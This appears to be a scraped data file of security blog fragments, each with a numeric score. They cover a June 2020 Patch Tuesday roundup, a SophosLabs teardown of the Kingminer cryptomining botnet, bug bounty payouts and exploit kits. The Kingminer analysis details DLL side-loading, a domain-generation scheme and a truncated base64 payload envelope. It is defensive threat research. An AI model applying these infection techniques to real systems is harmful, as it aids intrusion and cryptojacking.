(FreeBSD)iEYEARECAAYFAkovjOwACgkQFdaIBMps37KRpwCfaQF9q8KhElv6LqgFv3DX2h9chbEAn2Q0X8Qv8r5OySnhlAw2pMxlxkXK=Mh2u-----END PGP SIGNATURE-----Overall, I prefer this level of transparency.  If you think that exposing this level of information is ""bad for security,"" consider the following.First class intruders know about vulnerabilities before anyone else because they are constantly performing funded research to find them. They produce and test their own exploits.Second class intruders only need a hint to direct their resources towards identifying vulnerabilities.  In other words, once they hear of a weakness in a protocol or service, they swing their attention to that target and develop exploits. They produce and test their own exploits.Third class intruders know how to reverse engineer vulnerabilities from binary patches released by the vendor.  They produce and test their own exploits.Fourth class intruders use exploits leaked from higher classes to determine if systems are vulnerable. They test others' exploits.Administrators without Blue and Red teaming capabilities have to trust that the vendor is honest and competent.  They can't test anything so they don't know if they are really vulnerable or not, pre- or post-patch.So, keeping source code hidden only really hinders fourth class intruders to a certain degree, and it definitely hinders administrators who lack Blue and Red capabilities.
",0.010705180070842424
"Microsoft pushes fixes for 128 security bugs in June, 2020 Patch Tuesday",0.012041308166378273
"Written by
SophosLabs Offensive Security",0.008622298185940958
"June 09, 2020",0.008888173547472844
SophosLabs Uncut Threat Research Android Elevation of Privilege Exploits Microsoft Office Patch Tuesday updates vulnerability Windows Windows Update Word for Android,0.008912311023609232
"In this month’s Patch Tuesday, a total of 128 security vulnerabilities have been patched in Microsoft products, a slight increase compared to the last few months. Only twelve of the vulnerabilities are rated “Critical.” None of the bugs have been found being exploited in the wild (yet).
In addition, a remote code execution vulnerability in Adobe’s Flash player software is also rated critical, and an update (not distributed through the Windows Update mechanism) was released today by Adobe for Flash, for Adobe Framemaker, and for the Adobe Experience Manager.
Preceding this month’s update was a fix for an Elevation of Privilege vulnerability in Edge Chromium. As is the case with the browser, based on Chrome, updates to Edge Chromium are distributed from within the browser, independent of Patch Tuesday releases, and don’t require a system restart.
As usual all the additional details can be found in the Security Update Guide Release Notes and users can download patches manually from the Microsoft Security Update Catalog if there’s a delay getting updates automatically.
Some words about this month’s most notable bug fixes:
Office Remote Code Execution
Microsoft Word, CVE-2020-1321
Microsoft Excel, CVE-2020-1225, CVE-2020-1226
Word for Android, CVE-2020-1223
Remote Code Execution vulnerabilities in the Office suite can lead to compromise of a system if the user, running an unpatched version of the software, is enticed to open a malicious document by an attacker, most commonly delivered by way of email.
While such bugs in Office software for Windows come a dime a dozen, this month marks the first time that a CVE has been assigned to the Android version of Word.
While Sophos is a member of Microsoft’s MAPP program, the company provided no details about the specifics of this vulnerability in advance of the patch release. The company’s official notification indicates that the software doesn’t properly handle “a specially crafted URL file” but isn’t clear exactly what that means. The very nature of a remote code execution bug implies that the presence of this vulnerability in an Android app puts users of the not-up-to-date version of Word for Android at risk of having their Android phone hacked simply by opening the wrong document.
The updated version of this app has been made available through Google’s Play Store. As of this publication, the most recent version of Word for Android was released on May 18, 2020 and is version number 16.0.12827.20140.
Windows Elevation of Privilege
A whopping 69 bugs, more than a half of this month’s total count, fall under the category of Elevation of Privilege (EoP) vulnerabilities. The bugs are present in a wide range of Windows components and related packages.
EoP vulnerabilities could permit an attacker with limited access to a Windows system to gain more control over it, typically allowing for “escaping” a low integrity or sandboxed process by exploiting such a vulnerability, and subsequently gaining unlimited permissions to the system.
The following components of Windows are notable for their inclusion in this month’s update:",0.013545746885700316
"Windows Kernel Elevation of Privilege: 15 CVEs
Win32k Elevation of Privilege: 6 CVEs
OpenSSH for Windows Elevation of Privilege, CVE-2020-1292
Windows Lockscreen Elevation of Prvilege, CVE-2020-1279",0.01170185752180597
"Windows Kernel Security Feature Bypass
CVE-2020-1241
On its own, this bug is harmless to a system. However, when exploited, it allows for circumventing a security feature present in the Windows kernel, leaving the system more vulnerable to Elevation of Privilege attacks.
The security feature in question is the NULL Pointer Dereference protection, which was introduced in Windows 8.
The NULL Pointer Dereference bug class was once commonly exploited to attack operating system kernels in order to achieve Elevation of Privilege. In modern operating systems, security features have been put in place to prevent the conditions required for the successful exploitation of NULL Pointer Dereference bugs, effectively making this bug class largely obsolete.
By exploiting CVE-2020-1241, an attacker can “resurrect” this bug class on modern Windows systems, and open up the opportunity for them to be exploited.
Update about the CVE-2020-0796 (SMBGhost) vulnerability
As we wrote in March, Microsoft issued an patch to fix this vulnerability which, if exploited, can create a method for malware to copy itself from machine to machine. We typically call this type of potentially runaway behavior a wormable exploit, and we’ve seen this kind of thing used by increasing numbers of criminals in the form of, for example, EternalBlue. It’s hard to overstate the potential for damage these kinds of bugs can cause in a short period of time, as evidenced by the WannaCry ransomware outbreak a little over three years ago.
At the time we published that analysis, no known exploit existed for SMBGhost, but the situation has changed. At least two security teams claim to have developed a method to exploit the SMBGhost bug, a situation which prompted the US government’s Cybersecurity & Infrastructure Security Agency (CISA) to issue a warning about the bug, encouraging everyone to update Windows to eliminate this loophole.
If, for whatever reason, you have been deferring Windows updates since March, now is the time to pull the trigger on fixing this potentially very serious bug.
How is Sophos responding to these threats?
Here is a list of protection released by SophosLabs in response to this advisory to complement any existing protection and generic exploit mitigation capabilities in our products.",0.010917834263342585
CVE,0.015603552773460372
SAV,0.007429604172777826
IPS,0.010146075287656875
"CVE-2020-1213
Exp/20201213-A
SID:2303073",0.01151178516477147
"CVE-2020-1214
Exp/20201214-A
SID:2303074",0.011148406597079719
"CVE-2020-1215
Exp/20201215-A
SID:2303075",0.011239471760357111
"CVE-2020-1216
Exp/20201216-A
SID:36922",0.011154694384145958
"CVE-2020-1219
Exp/20201219-A
SID:2303076",0.011427354682260304
"CVE-2020-1230
Exp/20201230-A
SID:46548",0.011103989627476385
CVE-2020-1241,0.009896897087831591
SID:2303078,0.008263642996576892
CVE-2020-1260,0.009444508327892343
SID:2303077,0.008253633654828119
CVE-2020-1284,0.009452523350725217
"SID: 2302019
SID:2302029",0.008251857406142316
CVE-2020-1301,0.009494991033272449
"SID:2303080
SID:2303081",0.008965091529283375
"How long does it take to have Sophos detection in place?
We aim to add detection to critical issues based on the type and nature of the vulnerabilities as soon as possible. In many cases, existing detections will catch exploit attempts without the need for updates.
What if the vulnerability/0-day you’re looking for is not listed here?
If we haven’t released an update for a specific exploit, the most likely reason is that we did not receive the data that shows how the exploit works in the real world. As many of this month’s exploits were crafted in a lab and have not been seen in the wild, nobody has enough information (yet) about how criminals would, hypothetically, exploit any given vulnerability. If or when we receive information about real attacks, we will create new detections, as needed.",0.0103922475117596
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
Kingminer escalates attack complexity for cryptomining,0.011295229622614644
"Written by
Gabor Szappanos,",0.010162893769870451
Vikas Singh,0.010924127763571434
"June 09, 2020",0.008888173547472844
SophosLabs Uncut Threat Research Bitcoin Kingminer Monero XMRig,0.011275214825808066
"An opportunistic botnet that tries (not always successfully) to fly under the radar, Kingminer is nevertheless a persistent nuisance that delivers cryptocurrency miners as a payload. The botnet’s operators may be ambitious and capable, but they don’t appear to have endless resources, so they take advantage of any freely available solution to the problem of infecting machines and spreading, getting inspiration from public domain tools as well as techniques used by APT groups.
This morning, SophosLabs is releasing our report, An insider view into the increasingly complex Kingminer botnet. In this report, we perform an in-depth teardown of the botnet’s tactics, techniques, and procedures, with an eye to giving analysts and incident responders a roadmap for closing off the loopholes this threat uses to its advantage.
The main findings of our research are:",0.010890312220953713
"Kingminer spreads by brute-forcing username/password combinations of SQL servers, and has recently started to experiment with the EternalBlue exploit.
The infection process may use a privilege elevation exploit (CVE-2017-0213 or CVE-2019-0803) in an attempt to prevent software (or admins) from blocking the attackers’ activity.
The botnet’s operators prefer to use open source or public domain software (like PowerSploit or Mimikatz ) and exhibit evidence they’re skilled enough to customize their own enhancements.
They employ tricks like DLL side-loading, a method traditionally used by Chinese APT groups that’s gaining momentum broadly in cybercriminal activity
The botnet uses a domain generator algorithm (DGA) to potentially change the domains it uses for command and control or payload delivery automatically every week
If the infected computer is not patched against the Bluekeep vulnerability, Kingminer disables the vulnerable RDP service in order to lock out competing botnets",0.00851210628707677
"Download servers
The Kingminer botnet uses two main approaches in hosting the delivered content. The first one relies on servers that the criminals registered and manage themselves, usually using a simple time-coded domain name generation algorithm (DGA). These servers deliver the components with clearly malicious content.
For the not-so-obviously malicious things, the operators use public repositories provided by Github. This is where they store files like the xmrig miner payloads, reflective loader scripts, or the Mimikatz password stealer. These components are not necessarily malicious by themselves, but the context in which they are used (installed without user consent, by infecting the target computers) was clearly malicious.
Time coded DGA
The attackers have embedded an algorithm into the bots that generates domain names using the value of the current date and time. This method has the advantage that the malware doesn’t have to store hardcoded addresses for command and control. Instead, the bots dynamically generated and keep changing with time. This way, if one of the download servers is shut down, the operators don’t have to release new versions of the downloader with the updated download location. Instead, they just register the next domain name, and when the time comes, the botnet will automatically switch over to the new download servers.
The generated domain names have the following structure:",0.020334841055887565
"The yellow part is the core of the domain name. In the observed cases it was either fdae.tk, fdae.com or fghh.com, but strings found in the side-loading DLLs suggest that additionally the attackers could potentially use fdae.ga or fdae.cf in the domain cores.
The domain core is completed with the green prefix, combined from the current year/month/week value (week=day/7 in this case, rounded down), using only the last two digits of the year in the form: yymmwwyy. The resulting number is converted to a hexadecimal number.
In the example shown above, the date part of the domain is 0x30713, which when converted to decimal form gives 198419, making the date values to be yy=19, m=8, w=4. This domain name would have been used during the 5th week in August, 2019.
The red subdomain part is created from the minutes and seconds value of the current time.
Even though this mechanism makes it possible to use a different server very week, the botnet operators never use this opportunity to its full potential – the vast majority of the potential server names are never used and never registered and many components use hardcoded locations.
Github repositories
We have found over 20 Github user accounts that were used to deliver the contents of the Kingminer botnet.
These repositories are not very active, in the sense that only one or two commits are ever made to them. The first commit usually is an upload of the actual malicious components, then optionally an update was made, likely to avoid detections that were added in the meantime by security products.",0.01375044386188884
The typical content of a repository consists of the following files:,0.008704748664190909
"txt: 32-bit miner, XOR encrypted
cab: 32-bit miner side-loader CAB package stored in XML
txt: 32-bit miner, XOR encrypted
cab: 32-bit miner side-loader CAB package stored in XML
txt: 32-bit control panel applet, BASE64 encoded
txt: 64-bit control panel applet, BASE64 encoded
txt: 32-bit Mimikatz, XOR encrypted
txt: 64-bit Mimikatz, XOR encrypted
txt: reflective loader, BASE64 encoded",0.014254367705161863
"Infection process
So far, the only confirmed infection method that we could identify was the attack in which SQL servers experience brute-force probing with username/password combinations; When successful, the attackers insert SQL command scripts that load the rest of the components.
Recently we have seen signs that the operators of the Kingminer botnet started experimenting with an EternalBlue spreader. We have witnessed this script being delivered to the infected systems but have not observed a successful infection as a result of the exploitation.
The EternalBlue script is very much the same as the implementation found in another miner botnet, Powerghost/Wannaminer (which, itself, is based more or less on PowerShell Empire).",0.0119465727575776
"Downloader script
Whichever infection method is used, the first step is the execution of the downloader script, responsible for fetching and installing the rest of the botnet components.
The attackers have crafted custom payloads to the target operating system, deploying different version for 32-bit and 64-bit Windows systems.
The downloaded payload is not a plain executable file. Rather, it is packaged into an XML file. The XML file contains either a ZIP or a CAB archive, that, in turn, contains the necessary components.
Payload loading
Once the downloader script fetches the payload from the attacker’s server, it executes the payload, usually by utilizing the DLL side-loading technique, which has been popular with Chinese APT groups [1] for a long time. This method makes use of the peculiarities of the Windows operating system related to directory search order.
The payload that is downloaded from the remote server is originally packaged in an XML envelope:
<?xml version=""1.0"" encoding=""UTF-8""?>
<root xmlns:dt=""urn:schemas-microsoft-com:datatypes"" dt:dt=""bin.base64"">
TVNDRgAAAABsiQwAAAAAACwAAAAAAAAAAwEBAAMAAAAiCQAAdgAAAE4AAxUAhgAAAAAAAAAA
7jriTCAAZHdtZXIuZXhlAAAkAgAAhgAAAABLUJKSIABkdXNlci5kbGwAABwkAACqAgAAAEtQ
5IggAHgudHh0AG/LdHIEOwCAW4CAjQUgt8VxEwCwUwAkIgAAAADvXqnrvqa+UOVR0mSSIhLQ
When unpacked, the content of a typical 64-bit package looks like this:",0.01320972176436519
The main components in the packages are:,0.009754044043643773
"A clean, and digitally signed, trusted executable (exe in the example above)
A malicious loader DLL
The encrypted payload (txt)",0.019847818451686483
"The purpose of the clean executable is to have an external dependency on a Windows DLL library, which is a roundabout way to trigger the operating system to execute the malware, without directly calling the malware DLL.
When the downloader script executes the (benign) .exe, the operating system tries to resolve the DLL dependency, which it does by trying to find the DLL.
The first location it searches is the directory that contains the executable – ironically not the system32 directory, where Windows houses (and protects) all its legitimate DLL files. So, it automatically loads the malicious DLL, and executes the entrypoint function, which in turn loads the encrypted payload into memory, then decrypts it.
Then the malicious loader DLL uses an in-memory PE loader to convert the decrypted block of memory into a proper executable image, similar to how the operating system would do it (i.e. allocate the memory for the sections, set the section attributes, resolve the imports, locate the entry point). Finally, it loads the payload at the entry point of the executable.
If the loading is successful, the loader will enter an infinite waiting loop. This is done because the payload started in a separate thread, the main thread can never stop, and the miner can run indefinitely—an important consideration, because the DLL itself doesn’t create any methods to ensure its own persistence.
Malware fixes BlueKeep to block other infections
One of the more interesting components is a simple VBScript code that checks the Windows internal version number, searching for versions 5.0 (Windows 2000), 5.1 (Windows XP), 5.2 (Windows XP 64 or Windows Server 2003), 6.0 (Windows Vista or Windows Server 2008), or 6.1 (Windows 7 or Windows Server 2008 R2) – all of which are no longer supported by Microsoft, and potentially vulnerable to the BlueKeep exploit.
If the malware identifies that it is running on any of the vulnerable systems, the code goes on to list the installed hotfixes with the command and searches for the ones related to Bluekeep:
kb4499175: Windows 7 SP1
kb4500331: Windows XP, Windows Server 2003 SP2
KB4499149: Windows Server 2008 SP1
KB4499180: Windows Server 2008 SP1
KB4499164: Windows 7 SP1
If it finds none of the hotfixes (and thus the system is vulnerable to a Bluekeep attack), the script disables further Remote Desktop (RDP) .
The intent is likely to disable a possible infection vector that other cryptomining botnets could use to infect the computer. Although this exploit is not widely used, a couple of botnets were reported to have used it.
Xmrig miners
The primary payload and the most important component of the botnet is obviously the cryptominer program. In all of the identified cases, this was a variant of the public domain xmrig miner.
The miners are compiled into DLLs, the loader code locates the export named a and executes it. This is an unusual design; In other attacks of this type, the miners are compiled into standalone executables.",0.015551240129587085
"Interestingly, in addition to this main export, the miners also have the same SetDesktopMonitorHook and ClearDesktopMonitorHook as the side-loader DLLs, and both functions call the main exported function a.
This means, that in theory, the miner itself can serve as a side-loaded DLL, loaded by the clean application. So far, we have not seen scenarios that make use of this design.
The miners have two pool addresses configured (95.179.131.54 and w1.homewrt.com in the example above) to which they connect and upload the results of mining Monero.
Conclusion
Kingminer is one of the many medium-sized criminal enterprises who are more creative than the groups who simply use builders purchased from underground marketplaces. The threat actors behind Kingminer build their own solutions. In that, they are cost-effective, adopting open source solutions available in public code repositories.
As long as the sources of new tools and exploits are published, groups like Kingminer can and will continue to implement them into their arsenal, accelerating the adoption of the exploits and exploit techniques in the lower level tiers of criminality.
IoCs
Indicators of compromise for this article have been posted to the SophosLabs Github. Malware related to this threat will be detected as Troj/Kingmine-B.
Users of Sophos endpoint products with EDR can perform proactive threat hunts for Kingminer on their own network using the Kingminer non-deterministic queries posted to the Early Access Program’s community forum.",0.011247163024001083
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"1
",0.011966970221767848
Sophos ASG Up2Date 8.312 Released,0.008420643926560611
"Written by
Eric Bégoc",0.010229904213713614
"July 08, 2014",0.008422657382218257
Network OpenSSL up2date,0.007928306771403326
"We are pleased to announce that a new Up2Date package is available for Sophos ASG.
This update includes the fix for the OpenSSL SSL/TLS vulnerability (CVE-2014-0224).
Please read on to see the full details of this release.",0.011891716988959411
"Sophos ASG 8.312
News",0.009129164032372183
Security Update,0.007849980180340443
Remarks,0.009780636038266843
System will be rebooted,0.007758715382572667
Bugfixes,0.009816324567177737
"31846 Upgrade to UTM9 not possible on ASG 220B (rev3)
31940 OpenSSL SSL/TLS MITM vulnerability (CVE-2014-0224)",0.011712129203695909
"Download:
While you do not need to manually download Up2Date packages (they will automatically download and prepare themselves for you to install), for manual application of Up2Dates or for ASG installations without Internet connections, you can retrieve them using the link below.
Download Link: ftp://ftp.astaro.de/ASG/v8/up2date/u2d-sys-8.312.tgz.gpg
MD5 Sum: 5cf6e90f9e1157779888225610863d77
Size:  ~4MB
Sophos Up2Date technology makes it easy to update your Astaro Security Gateway. There are two ways to apply an already-downloaded Up2Date package to the system:
1. Log on to WebAdmin, navigate to Management >> Up2Date >> Overview and use Update to latest version now to install the Firmware Up2Date. Click on the “Watch Up2Date Progress in new window” and an extra browser window will show the progress of the Up2Date installation. (The System administrator will receive a notification email once the Up2Date process has finished.)
2. Download the Up2Date package from our HTTP or FTP Server and install it under Management >> Up2Date >> Advanced:",0.009264045536499732
Sophos UTM Up2Date FTP Mirrors:,0.007242273332700666
Feedback,0.009067519666800083
"If you want to provide feedback or want to discuss any of the ASG or UTM features you should post it on our User Bulletin Board. Please indicate the version you are using (e.g. “[8.310] Configuring Skype Blocking”).
If you have any feedback on our help, manual, or any documentation (Online Help) please send it to nsg-documentations@sophos.com.",0.015376383087338241
"Eric Bégoc
Senior Product Manager",0.010102162674290538
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"The world’s biggest bug bounty payouts
From finding flaws to suggesting innovative security measures for the future, we look at some of the biggest bug bounty payouts in recent years.",0.02087305867639233
Editor,0.013851582280746899
3 Aug 2015 - 10:57AM,0.010854649853353826
"From finding flaws to suggesting innovative security measures for the future, we look at some of the biggest bug bounty payouts in recent years.",0.017076998372223984
"So-called ‘bug bounties’ are offered by some of the world’s largest websites and software companies to ensure that software bugs are found and fixed by friendly security researchers, rather than by malicious hackers who could use the same flaws to cause significant damage.",0.016599449248841713
"Bug bounties are a relatively new phenomenon but, in recent years, have become a significant security measure for modern businesses, especially if that business is heavily reliant on the web.",0.018084495040324944
"In days gone by, security researchers reporting such flaws would likely have received a simple ‘thank you’ or perhaps even faced accusations of hacking themselves, such was the lack of understanding around these ‘white hat’ or ethical hackers.",0.018173066111236813
"But times have changed and there are now a variety of programs paying out large sums of money to researchers. From finding flaws and snitching on cybercriminals to suggesting innovative security measures for the future, we look at some of the biggest payouts in recent years.",0.014161706066058155
United Airlines,0.010634658357721594
United Airlines caused a stir in May when it announced a bug bounty program that would reward security researchers for finding bugs with free air miles rather than cash.,0.016924660766241995
"United’s rewards range from 50,000 air miles for low-level flaws, like cross-site request forgery and bugs in third-party software, to 250,000 miles for mid-level bugs, like personal information leaks, brute force attacks and authentication bypasses. Should a researcher find a RCE bug, they could be awarded up to one million miles.",0.011446485828786379
"Flaws found onboard the aircraft, like in the avionics and the in-flight Wi-Fi, are not eligible for the program. It also prohibits researchers disclosing bugs publicly or to any third parties.",0.012286710264866385
"Florida-based vulnerability researcher Jordan Wiens was one of the first to be awarded a bug bounty by United Airlines, receiving a million free air miles for finding a RCE bug in United’s web properties.",0.011291478007593114
"Australia-based bug hunter Nathaniel Wakelam also recently secured half a million United Airlines miles for a single bug he found on 16 May. A third bug hunter, Neal Poole, says he bagged 300,000 miles for a bug submitted this month.",0.012913204645394027
"Some reports suggest that one million air miles is enough for “several” first-class trips to Asia from the US, or for “up to 20 round-trips in the US”.",0.017355957700085245
Facebook,0.011690316117642374
"Facebook’s history with bug bounty programs is chequered – the social network famously refused one white hat any privileges after he managed to post a letter to Mark Zuckerberg’s profile page in 2013 but went on to introduce a ‘white card’ debit card program for researchers, before ditching it a year later. Nonetheless, the firm did pay out over $1 million to researchers in 2014.",0.011378887091842316
"In November 2013, Brazil computer engineer Reginaldo Silva found one of the worst vulnerabilities in Facebook’s software, netting a bug bounty of over $30,000. The bug related to code used for the authentication system OpenID, which lets people use the same log-in credentials for various online services.",0.01223527446110706
"Mr Silva found that the vulnerability could be executed from a remote computer, one of the most dangerous types of software flaws. It could have allowed a hacker to read almost any file and open arbitrary network connections on a Facebook server.",0.00904006258965051
"A Facebook spokesman later revealed to The Register that the final reward was $33,500.",0.01705095642323029
Microsoft,0.01083142353498212
"Microsoft awarded its first-ever $100,000 bounty to a security researcher who discovered a bug in Windows 8, late last year.",0.016433868374750915
"The Redmond giant has traditionally avoided handing out big rewards but the company announced its first bug bounties in late 2013, specifically designed for Windows 8.1 and Internet Explorer 11.",0.015832213988395294
"Microsoft was paying up to a generous $11,000 for IE exploits, but was offering even bigger money to researchers, should they come across “truly novel” exploitation techniques against the emerging Windows 8.1.",0.014469022396461528
"James Forshaw, a security researcher at UK-based Context Information Security, picked up the full $100,000 bounty for detailing a bug that worked around some protections in the preview version of Windows 8.1.",0.014773625183879702
"Mr Forshaw wasn’t able to go into details on the approach at the time because of Microsoft bounty rules, but later was able to go into greater depth on a Context blog.",0.012720321313381078
Microsoft (again),0.01007347079791765
"That wasn’t the first time Microsoft had paid out big to a security pro – the previous year, the Redmond software giant had paid Vasilis Pappas $200,000 for an innovative new security prototype designed to prevent the exploitation of memory safety vulnerabilities in Windows applications.",0.015108357448322396
"Mr Pappas, a PhD student at Columbia University at the time, had developed kBouncer, an “efficient and fully transparent ROP mitigation technique”, which he presented at Microsoft’s 2012 Blue Hat Prize event.",0.01900432866513202
"Microsoft said at the time it was seeking contestants who “could design the most effective ways to prevent the use of memory safety vulnerabilities, a key area of focus for Microsoft”. After whittling down the contestants to just three people, Mr Pappas eventually took home the big prize.",0.013700985881123007
Heartbleed,0.007019359647804424
"The well-publicized Heartbleed flaw (CVE-2014-0160) came to light in April 2014. It was specifically a defect in the OpenSSL cryptography library, which is a widely used implementation of the Transport Layer Security (TLS) protocol. It affected hundreds of thousands of web servers, and it’s believed many are still vulnerable today.",0.018752344890560768
"Fortunately, it was accidently spotted by Neel Mehta, a member of Google security’s team. Codenomicon reported that Google’s security team reported Heartbleed to OpenSSL first, but both Google and the Finnish cybersecurity firm discovered it independently. The flaw was accidently introduced by a German engineer when poking around the OpenSSL code.",0.01079207784908398
"The OpenSSL Project awarded Mehta $15,000 – a relatively paltry figure considering the seriousness of the Heartbleed flaw. The Daily Dot later reported that the Google researcher generously donated his reward to the Freedom of the Press Foundation, which supports the use of encryption and other security tools to protect journalist communications.",0.012122637352758092
Yahoo’s Flickr,0.009009283824431447
"The Yahoo-owned Flickr is one of the biggest photo management and sharing websites in the world, but its reputation took a dent when it was hit by a critical web application vulnerability last year, which left the website’s database open for hackers.",0.013408899636302762
"Security researcher Ibraham Raafat claimed to have found SQL injection vulnerabilities on Flickr Photo Books, a new feature for printing custom photo books using the service. He found two parameters (page id, item) that are vulnerable to a blind SQL injection vulnerability and Direct SQL Injection flaw, opening up for Remote Code execution.",0.008474071480543688
"A successful SQL injection could lead to attacker stealing database and MYSQL administrator password, Mr Raafat said, adding he was able to gain access to sensitive information within the Flickr database.",0.012191550031416143
"Yahoo acknowledged the problems and patched them within six hours, SC Magazine reported last year.
",0.020261133224893868
"Tools of the Trade: Exploit Kits
Exploit Kits are a serious cyber threat today, estimated to be responsible for the vast percentage of malware infections worldwide.  Exploit kits distributed currently through both public and underground sources appeal to a wide range of audiences, from inexperienced hackers to seasoned “black hat” cybercriminals.  Perhaps you or someone you know may have heard about some of the popular exploit kits in existence, like Blackhole, but didn’t really know what it was or an Exploit kit in general.  This week on Unpacked we’re going to fill in some of the blanks for our readers and take a look at exploit kits from the past to the present.",0.013599425188263958
"Overview
Exploit kits are a type of malicious toolkit used to exploit security holes found in software applications (Adobe Reader, etc) for the purpose of spreading malware.  These kits come with pre-written exploit code and target users running insecure or outdated software applications on their computers.   While the process of becoming exploited by one of these kits will vary, the procedure usually goes a bit like this:",0.010514730566781094
"A victim visits a website whose server has been hacked by cybercriminals.
The victim is redirected through various intermediary servers
The victim lands at a rogue server hosting the exploit kit
The exploit kit gathers information on the victim and determines the exploit to deliver
Exploit is delivered
If exploit succeeds, a malicious payload (custom malware program) is downloaded to the victim’s computer and executed.",0.011857185940488457
"The folks over at Hewlett Packard have also made a pretty good image depicting exploit kits in action.
How exploit kits work (image courtesy of HP)",0.0213758684617823
"The last step involving the payload is classified as a drive-by download since it happens without the victim’s knowledge or consent.  Drive-by attacks such as these have been used to deliver malware for many years, often in the form of an email message or popup windows—these attacks have a greater sense of predictability.  Since the exploits made from these kits can be launched when visiting legitimate websites, users are less likely to see an attack coming.
Background and Origin
Software exploitation is not a new concept and has been used for many years to spread malware.  As this trend increased, it only made sense to start packaging these exploits and selling them to cybercriminals for profit (who in turn use the kit to exploit thousands and potentially make more profit).
Kaspersky Labs states that MPack was one of the first publicly recorded kits available, released in late 2006 by Russian programmers.  Like the exploit kits of today, this kit was a collection of PHP scripts that targeted security holes in commonly used programs, like Apple Quicktime or Mozilla Firefox.  The kit went viral and was spotted on more than 10,000 websites shortly after release, as reported by security researcher Brian Krebs.
Mpack exploit kit – courtesy of Brian Krebs",0.016970921881394818
"Fast forwarding to the present, exploit kits have become increasingly more potent and continue to advance.  Today’s modern exploit kit comes neatly packaged by the author and does not require any knowledge of how an exploit works.   In addition, most exploit kits have a user-friendly web interface that allows licensed users to login and view active victims and statistics.  In some instances these kits even include a support period purchased from the author and included updates, much like the average commercial software of today.  Additions such as these make these kits very accessible to a wide range of users, even those with more limited computer proficiency.
Login page to view statistics.",0.017746606832236944
"The majority of exploit kits released today come from countries with a thriving underground cyber market, like China or Russia.  According to a new study recently conducted by Solutionary’s Security Engineering Research Team (SERT), about 70 percent of exploit kits released in Q4 2012 come from Russia, with China and Brazil following a distant second and third.  About another 20% have still not been attributed.
Courtesy of Solutionary’s SERT Q4 2012 report",0.015303537620514396
"Russia has a long cybercrime history with black hat programmers continuing to make extensive profits from writing these kits.  Organizations like the Russian Business Network (RBN) based in St. Petersburg have fueled this growth by providing a cybercrime platform; for many years, the RBN has continued to offer website hosting to exploit writers, allowing hackers to collaborate and sell their exploit kits to buyers internationally.  Today, the RBN does not exist as a single entity; it has since become harder to track, as they’ve since split into cells and changed names several times.
In the end it comes down to money.  It is a very profitable trade for the exploit author to create a manage these kits, as licenses can be very costly to purchase—as much as $10,000 per month—and these price tags are matched by an increasing demand.  Even a typical kit usually costs around $500 a month, and yet only includes a lot of the well-known exploits used for years.  The most expensive kits will include exploits that are either very secret or sophisticated, sometimes targeting zero-day vulnerabilities (discovered at release).  Malwarebytes forecasts that exploit kits will continue to be developed for many years to come, and criminals will continue to pay premium rates to use them for spreading malware.
Exploited software
Oftentimes, exploit code authors target software with a history of numerous security flaws because it makes their job easier and achieves the same result, which is bypassing restrictions set in place by a program and achieving what’s known as “privilege escalation”.  With escalated (increased) privileges, arbitrary programs can be downloaded and executed on the victim’s computer without prior consent.
Many of the kits all have overlapping exploits, some of which are still working years after discovery.  In fact, it’s estimated that about 60 percent of vulnerabilities targeted in today’s exploit kits are over two years old.  These exploits are still working because many users simply don’t bother with updating their software.  In response to user negligence, a lot of software companies are pushing out automatic updates to their programs that occur while they’re running.
There isn’t a level playing field here—some software is exploited more than others.  Oracle Java along with several Adobe products is frequently exploited, with new Common Vulnerabilities and Exposures (CVE) identifiers recorded daily for their products.  Because it increases the chance of malware infection, software that’s targeted for exploitation is usually very popular and likely to be installed on the victim’s computer.  For example, web browser programs like Mozilla Firefox and Opera are commonly targeted since they’re used by many to surf the internet.  Other web browsers like Internet Explorer are targeted because they are part of the Operting system itself, guaranteed to be installed for Windows users.
To give our readers an idea of just how many vulnerabilities exist in some software products, Oracle addressed a whopping 50 security holes found in the Java software just this month.  Due to the countless security holes, exploits for many of these programs like Java have become very popular and are most likely inside every exploit kit released.  In addition, many vulnerabilities have also been discovered in Adobe products this year, no doubt with more to come.
List of recent vulnerabilities found in Adobe products.",0.019288770125731713
"As a consumer using these products, you may be unaware of how many vulnerabilities there are on your computer; therefore, it’s important to pay very close attention to new threats discovered and decide whether it is worth the risk to use a certain program.  While in some cases an alternative program can be found to reduce the chance of exploitation, the continuous risk may still be too great, and it may be better to stop using these commonly exploited programs altogether if possible.
Anatomy of an exploit kit
Nearly every exploit kit has a web interface built on PHP, a popular server-side scripting language.  A typical kit will have a directory for exploits, one for images, and perhaps another for configuration data.  Another page is also included and acts as a statistics page, allowing the owner to view exploited computers and data about them, to include geographical location, Operating System and version, software installed, exploit delivered, and more.  This data can be valuable to see which targets are most vulnerable and use that to spread more malware.
Contents of Crimepack exploit kit",0.011343943545492174
"One of the most crucial parts of the exploit kit is the landing page.  A landing page is a specially crafted webpage and may have a generic name, like index.php.  The landing page is initially requested and serves as the starting point for the exploit process.  This page is designed to collect data on the victim and use this data to determine which exploit to deliver, and also interacts with other pages in the exploit kit to provide obfuscation and encoding routines, as well as various other services.
Another important component of an exploit kit is the control panel.  From this page you can adjust exploits used and upload a custom malware to be executed thereafter.  Some kits are configured to use only a handful of exploits, and others employ more of a “brute force” approach, launching a wide variety of exploits until one succeeds.  The image below displays a control panel for the notorious Crimepack exploit kit.
Exploits available in crimepack kit",0.012720287338677028
"Also, since exploit kit authors want to prevent their product from being freely distributed, the exploit kit itself is sometimes encoded to protect from being viewed or changed.  A popular tool for this and for all PHP pages in general is the ionCube encoder.  The images below compares a PHP page encoded with ionCube to a normal one; notice how one is readable and the other must be first translated by a loader program.
Left: PHP page encoded with ionCube encoder.Right: Normal PHP page",0.012060929456042646
"Like a normal software application, an exploit kit is made up of several different parts.  More advanced kits may also make use of software libraries to extend their functionality for other devious purposes.  The exploit kits of the future are expected to advance and include additional protective features, like ionCube encoding, that inhibit analysis from reverse engineers.
Acquiring a kit
Due to their illicit nature, acquiring exploit kits can sometimes be a difficult process.  Most of these kits are only available in underground black hat forums where they’re licensed directly from the author.  These forums aren’t usually indexed in popular search engines, such as Google, and therefore can be difficult to find without doing a little digging first.
